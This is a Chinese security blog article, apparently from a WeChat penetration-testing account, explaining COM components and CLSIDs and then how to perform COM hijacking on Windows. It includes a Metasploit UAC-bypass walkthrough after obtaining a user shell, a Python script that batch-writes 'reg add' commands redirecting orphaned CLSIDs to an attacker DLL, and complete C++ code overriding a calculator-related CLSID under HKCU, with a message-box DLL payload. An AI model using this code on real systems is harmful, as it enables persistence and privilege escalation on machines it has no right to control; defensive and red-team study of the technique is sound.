> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fa_mquAPs2Tjf12yXRKq5w)

何为 com
======

COM 是 Component Object Model （组件对象模型）的缩写。

COM 是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在 COM 构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。

COM 是开发软件组件的一种方法。组件实际上是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。开发自定义的 COM 组件就如同开发动态的，面向对象的 API。多个 COM 对象可以连接起来形成应用程序或组件系统。并且组件可以在运行时刻，在不被重新链接或编译应用程序的情况下被卸下或替换掉。Microsoft 的许多技术，如 ActiveX, DirectX 以及 OLE 等都是基于 COM 而建立起来的。并且 Microsoft 的开发人员也大量使用 COM 组件来定制他们的应用程序及操作系统。

这里有一个问题，为什么要用 com 组件呢？

com 组件主要是解决了代码共用以及版本问题、能够调用其他软件的功能、所有代码都能够面向对象

com 与注册表的关系
===========

注册表大家都应该比较熟悉，他主要具有一些特殊的数据类型来存储一些数据满足应用程序的需要，主要有以下几个

> HKEY_CLASSES_ROOT 用于存储一些文档类型、类、类的关联属性
> 
> HKEY_CURRENT_CONFIG 用户存储有关本地计算机系统的当前硬件配置文件信息
> 
> HKEY_CURRENT_USER 用于存储当前用户配置项
> 
> HKEY_CURRENT_USER_LOCAL_SETTINGS 用于存储当前用户对计算机的配置项
> 
> HKEY_LOCAL_MACHINE 用于存储当前用户物理状态
> 
> HKEY_USERS 用于存储新用户的默认配置项

**CLSID**

class identifier（类标识符）也称为 CLASSID 或 CLSID，是与某一个类对象相联系的唯一标记 (UUID)。一个准备创建多个对象的类对象应将其 CLSID 注册到系统注册数据库的任务表中，以使客户能够定位并装载与该对象有关的可执行代码。

当初微软设计 com 规范的时候，有两种选择来保证用户的设计的 com 组件可以全球唯一：

第一种是采用和 Internet 地址一样的管理方式，成立一个管理机构，用户如果想开发一个 COM 组件的时候需要向该机构提出申请，并交一定的费用。

第二种是发明一种算法，每次都能产生一个全球唯一的 COM 组件标识符。

第一种方法，用户使用起来太不方便，微软采用第二种方法，并发明了一种算法，这种算法用 GUID（Globally Unique Identifiers）来标识 COM 组件，GUID 是一个 128 位长的数字，一般用 16 进制表示。算法的核心思想是结合机器的网卡、当地时间、一个随即数来生成 GUID。从理论上讲，如果一台机器每秒产生 10000000 个 GUID，则可以保证（概率意义上）3240 年不重复。

也就是说 CLSID 就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过 CLSID 来寻找对象的。比如我的电脑的 CLSID 就为`{20D04FE0-3AEA-1069-A2D8-08002B30309D}`，控制面板的 CLSID 就为`{21EC2020-3AEA-1069-A2DD-08002B30309D}`

CLSID 的路径位于`HKEY_CLASSES_ROOT\CLSID`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRrsB1uL5UL8bV8VlUgULfrJSVQZW91qUO29mibLVibgGkrucdDKFJicp5Q/640?wx_fmt=png)

CLSID 其实是一个结构体，结构如下

```
typedef struct _GUID {    DWORD Data1; // 随机数     WORD Data2; // 和时间相关    WORD Data3; // 和时间相关    BYTE Data4[8]; // 和网卡MAC相关    } GUID;    typedef GUID CLSID;  // 组件ID    typedef GUID IID;    // 接口ID
```

com 劫持
======

前面说了这么多的基础知识来到今天的正文，首先要了解 com 组件的加载过程，com 组件会根据以下路径去寻找

> HKCU\Software\Classes\CLSID
> 
> HKCR\CLSID
> 
> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\shellCompatibility\Objects\

那么我们如果想要进行 com 劫持，肯定挑选的是首先寻找的路径，即`HKCU\Software\Classes\CLSID` ，我们可以直接在 CLSID 下新建一个对象 ID，与 dll 劫持不同的是，dll 劫持只能劫持 dll，局限性比较大，但是 com 组件能够劫持如. com 文件、pe 文件、api 文件等等

COM 对象是注册表中对磁盘上没有实现文件的对象的引用。例如，在注册表项 HKCU \ CLSID \ {xxxx} \ InprocServer32 \ Default 下，其中 {xxxx} 是 COM 对象的相应 GUID，您应该找到对文件 yyy.dll 的引用。如果磁盘上不存在此文件或缺少 “（默认）” 条目，则请求访问此对象的进程将失败。

那么这可以衍生出两种思路，第一种思路就是寻找被 “遗弃 “的 com 键进行劫持，那么何为被 "遗弃" 的 com 键呢？

在一些程序卸载后，注册表内的 com 键会被遗留下来，即处于为注册的状态，这个 com 键会指向一个路径里面的 dll，但是因为这个程序已经被卸载了，所以肯定是找不到这个 dll 的，那么这里我们就可以修改这个 com 键指向的路径来完成我们自己 dll 的加载 0

第二种思路就是覆盖 COM 对象，在`HKCU`注册表中添加正确的键值后，当引用目标 COM 对象时，`HKLM`中的键值就会被覆盖（并且 “添加” 到`HKCR`中）。

实现 com 劫持
=========

之前在实战的过程中在 msf 上拿到了 user 权限的 shell，但是直接 getsystem 不能够提到系统权限，用到了`bypassuac`之后得到了系统权限的 dll，那么这里首先看一下 msf 是怎么实现 com 劫持 bypassuac 的

首先拿到一个 shell 直接 getsystem 提权失败

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRfUbFcia5LRBN2C7qZprtwyQXicj4usZWicxPDRSEzfTvaYDZrjwjn4Sgw/640?wx_fmt=png)

然后使用 com 组件 bypassuac

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRvbCnzFx0Ls6Z1iajtZ39iapqepeHicBjIxIu1r9DrK1NAicGNvEhODcfmg/640?wx_fmt=png)

首先我把 uac 调到最高

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRJCpK9aG9nPUdTZvh8ES5oPdN2ah0Y6Ylc2hOlgRGpvibaNfVCM4xzyQ/640?wx_fmt=png)

发现这里报错，因为`UAC is set to Always Notify`，也就是说最高级的 uac 好像绕不过

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRFQeykiaS55l4iacEok7X4dxuGnjZcUBnneCZeF9GwzJoZqfRwtPECSVw/640?wx_fmt=png)

然后我把 uac 调整到默认级别

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uReibJeBuh6mGp9wFM6tjOzX0oAjvYBAMgn2kCTWor7GvBTEpYI8qw0cA/640?wx_fmt=png)

发现 msf 劫持的是`HKCU\Software\classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}`，dll 的位置在`C:\Users\messi \AppData\Local\Temp\LlvIwfwd.dll`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRBPcZFjGicVIFCDYDn5NJHiaMibbhCI6fMMgJjgXvAdwgKXQLElFn6W0GA/640?wx_fmt=png)

那么思路就清晰了，我们就需要修改注册表，然后让注册表的路径指向我们存放 dll 的路径即可

利用缺失的 CLSID
-----------

这里我选择的是对计算器进行 com 劫持，首先找一下缺少的 CLSID 并在`InprocServer32`下

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uR8XVScicTqziaIkPdu9JtMhOjk0xiaK2sMt5FLDlIKdv1CAiakqlsSdKB4Q/640?wx_fmt=png)

找到了几个能够劫持的 com 组件

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRfRuLZdP6ib4NgxIGmOgVrDSWRjjEdskr35akudriaHvGGOHBqBJBdbzw/640?wx_fmt=png)

保存并导出为`Logfile.CSV`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRY1H0mARR5lvibRkNFNUx9OPLWkia0euN16LSDJ6hWl6btsdmXhc20bHg/640?wx_fmt=png)

然后写一个 py 脚本，批量循环添加注册表指向 dll 路径并生成一个`com_hijack.bat`

```
reg add [PATH] /ve /t REG_SZ /d C:\\Users\\Administrator\\testdll.dll /f
```

完整代码如下

```
import csvclass Inject(object):    def __init__(self):        self.path='Logfile.CSV'    def add(self):        with open(self.path,'r',encoding='utf-8') as r:            g=csv.DictReader(r)            for name in g:                z=[x for x in name]                for i in z:                    if 'HK' in str(name[i]):                        print('reg add {} /ve /t REG_SZ /d C:\\Users\\Administrator\\Desktop\\testdll.dll /f'.format(name[i]),file=open('com_hijack.bat','a',encoding='utf-8'))if __name__ == '__main__':    obj=Inject()    obj.add()    print('[!] Administrator run com_hijack.bat')
```

执行 py

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRvCRPeSgKZWibTYfXianbUK5dk5jDdvHqmpbicOe1p24zY6blhibRUibHtng/640?wx_fmt=png)

即在目录下生成一个`com_hijack.bat`，使用管理员权限运行

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRicqasr6WoZqiaubwNY3CxvH4RZnK5iaVCoVwgWcE730P47M6FRsqhI20g/640?wx_fmt=png)

设置过滤条件发现已经成功劫持

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRy4JicPulibnRRBXt3fzfkKpx6AnWK19k1yytK7te3BnydZPsk3kNdz2A/640?wx_fmt=png)

覆盖存在的 CLSID
-----------

这里覆盖存在的 CLSID 就需要尽可能挑选应用范围广的，这里选择计算器进行劫持，对应的 CLSID 为`{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}`，这个 CLSID 可以实现对`CAccPropServicesClass`和`MMDeviceEnumerator`实例的劫持

进行注册表的创建用到的 api 为`RegCreateKeyExA`，结构如下

```
LONG RegCreateKeyEx(  HKEY hKey,                                  // handle to open key  LPCTSTR lpSubKey,                           // subkey name  DWORD Reserved,                             // reserved  LPTSTR lpClass,                             // class string  DWORD dwOptions,                            // special options  REGSAM samDesired,                          // desired security access  LPSECURITY_ATTRIBUTES lpSecurityAttributes, // inheritance  PHKEY phkResult,                            // key handle   LPDWORD lpdwDisposition                     // disposition value buffer);
```

> hkey：注册表的句柄
> 
> lpSubKey：此函数打开或创建的子项的名称，不能为 NULL
> 
> Reserved：保留参数，必须为 0
> 
> lpClass：该键的用户定义类类型。可以忽略此参数。此参数可以为 **NULL**
> 
> dwOptions：有几个参数，这里就不写了
> 
> samDesired：指定要创建的密钥的访问权限的掩码
> 
> lpSecurityAttributes：指向 SECURITY_ATTRIBUTES 结构的指针
> 
> phkResult：指向接收打开或创建的键的句柄的变量的指针
> 
> lpdwDisposition：指向接收处置值之一的变量的指针
> 
> 函数执行成功则返回 ERROR_SUCCESS，函数执行失败则为非零错误代码

修改注册表的属性用到的 api 为`RegSetValueExA`

```
LSTATUS RegSetValueExW(  HKEY       hKey,  LPCWSTR    lpValueName,  DWORD      Reserved,  DWORD      dwType,  const BYTE *lpData,  DWORD      cbData);
```

> hkey：注册表的句柄
> 
> lpValueName：要设置的值的名称
> 
> Reserved：保留值，必须为 0
> 
> dwType：lpData 参数指向的数据类型
> 
> lpData：要存储的数据
> 
> cbData：lpData 参数指向的信息的大小，以字节为单位
> 
> 函数执行成功则返回 ERROR_SUCCESS，函数执行失败则返回非零错误代码

那么首先使用`RegCreateKeyExA`创建注册表

```
RegCreateKeyExA(HKEY_CURRENT_USER,            "Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",            0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
```

再用`RegCreateKeyExA`设置 DLL 文件的属性

```
RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)system1, (1 + ::lstrlenA(system1)))
```

然后再设置`InprocServer32`下的`ThreadingModel`属性，这里我们随便打开一个`CLSID`里面的`InprocServer32`文件夹，发现都是由一个 dll 文件的路径 + 一个`ThreadingModel`组成的，这个`ThreadingModel`键值是用来标记 dll 的线程模型，它代表容纳此 COM 类的载体应当是一个动态链接库，对应的值就为`Apartment`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRrpdKaJr06XrgfstVkz5hgDx4ricRDSdLSxibh3urBbsYDbBqEUuia1W6g/640?wx_fmt=png)

那我们定义一个数组，再修改`ThreadingModel`的值即可完成`InprocServer32`属性的修改

```
char system2[] = "Apartment";RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)system2, (1 + ::lstrlenA(system2)))
```

对应的，我们进行 com 劫持完成之后，也需要写一个卸载的代码，这里就不细说了直接贴上来，跟前面的思路差不多，使用到`RegDeleteValueA`删除注册表属性即可，代码如下

```
RegCreateKeyExA(HKEY_CURRENT_USER,        "Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",        0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition)    RegDeleteValueA(hKey, NULL)    RegDeleteValueA(hKey, "ThreadingModel")
```

完整代码如下

```
// COMInject.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。//#include <iostream>#include <Windows.h> #include <string>using namespace std;BOOL COMInject(){    HKEY hKey;    DWORD dwDisposition;    char system1[] = "C:\\Users\\administrator\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\comInject.dll";    char system2[] = "Apartment";    string defaultPath = "C:\\Users\\administrator\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}";    string szSaveName = "C:\\Users\\administrator\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\comInject.dll";    {        if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,            "Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",            0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))        {            printf("创建注册表失败！");            return 0;        }        if (ERROR_SUCCESS != RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)system1, (1 + ::lstrlenA(system1))))        {            printf("设置DLL文件失败！");            return 0;        }        if (ERROR_SUCCESS != RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)system2, (1 + ::lstrlenA(system2))))        {            printf("设置ThreadingModel失败！");            return 0;        }    ::MessageBoxA(NULL, "comInject OK", "", MB_OK);    }}BOOL UnCOMInject(){    HKEY hKey;    DWORD dwDisposition;    string defaultPath = "C:\\Users\\administrator\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}";    string szSaveName = "C:\\Users\\messi\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\comInject.dll";    if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,        "Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",        0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))    {        printf("创建注册表失败！");        return 0;    }    if (ERROR_SUCCESS != RegDeleteValueA(hKey, NULL))    {        printf("移除DLL文件失败！");        return 0;    }    if (ERROR_SUCCESS != RegDeleteValueA(hKey, "ThreadingModel"))    {        printf("移除ThreadingModel失败！");        return 0;    }    remove(szSaveName.c_str());    remove(defaultPath.c_str());    ::MessageBoxA(NULL, "Delete comInject OK", "", MB_OK);}int main(int argc, char* argv[]){    COMInject();        //UnCOMInject();        return 0;}
```

这里就生成一个最简单的弹窗吧，dll 代码如下：

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。# include "pch.h"# include <stdlib.h>BOOL APIENTRY DllMain(HMODULE hModule,    DWORD  ul_reason_for_call,    LPVOID lpReserved){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        MessageBoxA(0, "comInject OK", "", 0);    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}
```

首先以管理员权限执行`COMInject.exe`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRVFHm5Cat8OYdW2Rm9F1sXMLp5VWLhvH1ic1mCiakiaojyZRD11Pq1pIBQ/640?wx_fmt=png)

然后进入`C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Installer`路径发现创建了`{BCDE0395-E52F-467C-8E3D-C4579291692E}`这个文件夹

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRqxX8GprQIq6GvlaZTNgjbhpogNbft82GHtWpqjfnzJCWug12NGZbxQ/640?wx_fmt=png)

再进入文件夹发现有`comInject.dll`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRicuKF81zd6tcQD2AdhI7bKS3Jd55sVia0cJzQjxuByHkBYYFGsSp7iaYA/640?wx_fmt=png)

再去注册表里面看一下

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRrd0uvYufdcYnric9uM8USEb161peXnckhWExGCz5ibJIib6Y0ViancI1ug/640?wx_fmt=png)

发现已经改成了 dll 存放的路径

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRBVnfORt9ibLmOM7iclZIcGxvSwE0eJsY6RhhA0lYQibUPwK3OsibOia0Cqg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uR2m5xGGXJD3Xvib0e8t7Zv8tFTD9oGt7fH35sgibxtjTRSgOibjgm8Y72A/640?wx_fmt=png)

打开计算器即可实现 com 劫持

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9d0ETmDdQPCpthhwPJq7uRCahV6Wg0C1Lw2QQ7Tib5OKWYSchEbXGekUwCX3EhAFGKFO73PAJicgIg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读**

[**干货 | HOOK 技术实战**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247500704&idx=1&sn=03ddbc3756466ae79c367e464720f1e0&chksm=ec1c969fdb6b1f891f3742aa24c7124a7ff119671c3eb58aa1a99b718a52b49850562e048c69&scene=21#wechat_redirect)  

[**干货 | 免杀沙箱调试与反调试实战**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247500664&idx=1&sn=0280597588368e0f7ee559c07135f1e1&chksm=ec1c9647db6b1f517a15fa769e684289281368f949dd6191cc3c78e6d57c842782623a83b299&scene=21#wechat_redirect)  

[**干货 | Certutil 在渗透中的利用和详解**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247500599&idx=1&sn=7911b606612671a76e6e5d78ebc0a8d3&chksm=ec1c9608db6b1f1e43ab0060ed74225bfc5e2210a258082763de4a01a4db6cff0f1514d7c6b0&scene=21#wechat_redirect)  

[**干货 | DLL 注入常用的几种方式**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247500596&idx=1&sn=aec77e5ee4347553cb395a616386ffa1&chksm=ec1c960bdb6b1f1d64827ce3c6464b3e81d7f2f88245e52bf7dea85ce712a24cbfec92df3d80&scene=21#wechat_redirect)  

**点赞    在看    评论**

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)